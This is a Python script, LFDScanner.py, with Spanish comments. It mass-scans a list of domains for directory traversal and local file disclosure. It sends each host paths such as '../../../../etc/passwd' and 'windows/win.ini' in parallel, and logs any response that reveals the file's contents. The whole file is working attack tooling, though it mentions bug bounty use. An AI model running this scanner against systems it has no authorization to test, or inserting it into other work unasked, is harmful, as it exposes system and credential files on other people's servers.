# LFDScanner.py

import requests
import argparse
import logging
import colorama
from multiprocessing import Pool
from colorama import Fore, Style, init
import re
import signal

# Inicializar colorama
init(autoreset=True)

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Clase para manejar colores
class Colores:
    VERDE = Fore.GREEN
    ROJO = Fore.RED
    AMARILLO = Fore.YELLOW
    RESET = Style.RESET_ALL

def imprimir_banner():
    """Imprime un banner de bienvenida."""
    banner = r"""
  __    ___  ___  __                                 
 / /   / __\/   \/ _\ ___ __ _ _ __  _ __   ___ _ __ 
/ /   / _\ / /\ /\ \ / __/ _` | '_ \| '_ \ / _ \ '__|
/ /___/ /  / /_// _\ \ (_| (_| | | | | | | |  __/ |   
\____/\/  /___,'  \__/\___\__,_|_| |_|_| |_|\___|_|   
                                                      
    """
    print(Colores.VERDE + banner + Colores.RESET)

def test_domain(domain, traversal_paths, headers, timeout):
    for path in traversal_paths:
        try:
            full_url = f"{domain.rstrip('/')}/{path.lstrip('/')}"
            response = requests.get(full_url, headers=headers, timeout=timeout)
            response.raise_for_status()

            if "root:" in response.text or "localhost" in response.text:
                logger.info(f"[+] Posible LFD encontrado en {full_url}:\n{response.text[:200]}")
            else:
                logger.info(f"[-] No vulnerable con el path {path}")
        except requests.HTTPError as e:
            logger.warning(f"[!] Error HTTP al acceder a {full_url}: {e}")
        except requests.ConnectionError as e:
            logger.warning(f"[!] Error de conexión al acceder a {full_url}: {e}")
        except requests.Timeout as e:
            logger.warning(f"[!] Tiempo de espera agotado al acceder a {full_url}: {e}")
        except Exception as e:
            logger.error(f"[!] Error inesperado al acceder a {full_url}: {e}")

def validate_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def signal_handler(sig, frame):
    logger.info("Interrupción recibida, deteniendo el escaneo...")
    exit(0)

def main():
    # Configurar los argumentos de línea de comandos
    parser = argparse.ArgumentParser(description="Prueba Directory Traversal y Local File Disclosure en múltiples dominios.")
    parser.add_argument("-L", "--list", required=True, help="Ruta al archivo que contiene la lista de dominios.")
    parser.add_argument("-A", "--agent", default="Mozilla/5.0 (compatible; bounty-checker/1.0; +http://your-hackerone-email)", help="User-Agent para la solicitud.")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Tiempo de espera (en segundos) para cada solicitud.")
    parser.add_argument("-c", "--config", help="Ruta al archivo de configuración.")

    args = parser.parse_args()

    # Imprimir el banner al inicio
    imprimir_banner()

    # Configurar el manejador de señales
    signal.signal(signal.SIGINT, signal_handler)

    # Cargar dominios desde el archivo especificado
    with open(args.list, 'r') as f:
        domains = [line.strip() for line in f if line.strip()]

    # Validar URLs
    domains = [domain for domain in domains if validate_url(domain)]

    # Rutas de Directory Traversal comunes
    traversal_paths = [
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts"
    ]

    # Configuración de encabezados
    headers = {
        "User-Agent": args.agent
    }

    # Multiprocesamiento
    with Pool() as pool:
        pool.starmap(test_domain, [(domain, traversal_paths, headers, args.timeout) for domain in domains])

if __name__ == "__main__":
    main()
